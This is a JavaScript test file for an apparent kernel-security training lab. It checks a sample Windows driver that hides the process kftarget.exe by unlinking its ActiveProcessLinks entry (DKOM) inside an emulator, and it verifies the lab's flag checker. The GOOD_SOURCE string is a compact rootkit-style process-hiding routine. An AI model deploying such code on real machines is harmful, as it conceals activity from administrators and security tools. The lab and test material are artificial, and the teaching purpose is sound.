/**
 * DKOM driver builder + execution tests.
 * Validates the full pipeline: C source validation → machine code gen →
 * PE load → ntsim execution → kftarget hidden → flag address extracted.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import path from "node:path";
import { fileURLToPath } from "node:url";

import { StructTables } from "@kernelforge/ntsim/src/structs.mjs";
import { JsInterpreter } from "@kernelforge/ntsim/src/cpu.mjs";
import { getScenario } from "../src/scenarios.js";
import {
  validateDriverSource, runDkomDriver,
} from "../src/driver-builder.mjs";

const TABLES_DIR = path.join(
  path.dirname(fileURLToPath(import.meta.url)),
  "../../../packages/ntsim-assets/data/vergilius/windows-10/22h2"
);

const GOOD_SOURCE = `
NTSTATUS DriverEntry(PDRIVER_OBJECT drv, PUNICODE_STRING reg) {
    PEPROCESS target = NULL;
    NTSTATUS status = PsLookupProcessByProcessId((HANDLE)888, &target);
    if (!NT_SUCCESS(status)) return status;

    PLIST_ENTRY links = (PLIST_ENTRY)((PUCHAR)target + 0x448);
    RemoveEntryList(links);
    DbgPrint("DKOM: unlinked kftarget.exe, LIST_ENTRY @ %p\\n", links);

    ObDereferenceObject(target);
    return STATUS_SUCCESS;
}
`;

const BAD_SOURCE = `
NTSTATUS DriverEntry(PDRIVER_OBJECT drv, PUNICODE_STRING reg) {
    DbgPrint("hello world but no DKOM\\n");
    return STATUS_SUCCESS;
}
`;

async function bootedWithDump() {
  const raw = JSON.parse(await readFile(
    path.join(path.dirname(fileURLToPath(import.meta.url)),
      "../../../apps/web/public/dumps/kdemu-win10-19041.json"), "utf8"));
  const tables = new StructTables();
  for (const name of ["_EPROCESS","_LIST_ENTRY","_UNICODE_STRING",
    "_KLDR_DATA_TABLE_ENTRY","_PS_PROTECTION","_KPCR","_KPRCB","_ETHREAD"]) {
    const j = JSON.parse(await readFile(path.join(TABLES_DIR, `${name}.json`), "utf8"));
    tables.register(name, j.totalSize, Object.values(j.fieldsByName));
  }
  const scenario = getScenario("boot-default");
  return scenario.boot({
    makeBackend: (mem) => new JsInterpreter(mem),
    loadTables: async () => tables,
    dumpWorld: raw,
  });
}

test("validateDriverSource accepts correct DKOM code", () => {
  const r = validateDriverSource(GOOD_SOURCE, "dkom-hide");
  assert.equal(r.ok, true, `errors: ${r.errors.join("; ")}`);
});

test("validateDriverSource rejects missing DKOM patterns", () => {
  const r = validateDriverSource(BAD_SOURCE, "dkom-hide");
  assert.equal(r.ok, false);
  assert.ok(r.errors.length > 0); // missing DKOM patterns detected
});

test("runDkomDriver hides kftarget.exe and extracts flag address", async () => {
  const { kernel } = await bootedWithDump();
  const tables = kernel.tables;
  const linksOff = tables.offsetOf("_EPROCESS", "ActiveProcessLinks");

  const kftarget = kernel.processesByName.get("kftarget.exe");
  assert.ok(kftarget, "kftarget.exe not in process list");

  const result = runDkomDriver(kernel, kftarget, { linksOffset: Number(linksOff) });
  assert.equal(result.status, "ok", `driver faulted: ${result.status} rip=${kernel?.cpu?.rip ?? "?"}`);
  assert.ok(result.targetGone, "kftarget.exe still visible after DKOM");

  // !process must confirm
  const after = kernel.listProcesses();
  assert.equal(after.find((p) => p.name === "kftarget.exe"), undefined,
    "!process still shows kftarget");

  // flag address extracted from DbgPrint
  assert.ok(result.linksAddress !== null && result.linksAddress > 0n,
    `no LIST_ENTRY address extracted; dbgLog: ${JSON.stringify(result.dbgLog)}`);

  // the address should be kftarget's ActiveProcessLinks VA
  const expectedLinks = kftarget + linksOff;
  assert.equal(result.linksAddress, expectedLinks);

  // cross-layer: the flag checker MUST accept the sim-derived address, both
  // as printed by runDkomDriver and in sloppy case/spacing form (answers are
  // normalized trim+lowercase — regression: stale hash rejected the answer).
  const { checkFlag } = await import("@kernelforge/lab-runtime");
  const { catalog } = await import("@kernelforge/course-content");
  const def = catalog.modules[0].lessons
    .flatMap((l) => l.labs.flatMap((x) => x.flags))
    .find((f) => f.id === "m1.l2.f1");
  assert.ok(def, "m1.l2.f1 missing from catalog");
  assert.equal(
    await checkFlag(`0x${expectedLinks.toString(16)}`, def), true,
    `checker rejects sim-derived address 0x${expectedLinks.toString(16)}`);
  assert.equal(
    await checkFlag(`  0X${expectedLinks.toString(16).toUpperCase()} `, def), true,
    "checker must normalize case + whitespace");
});
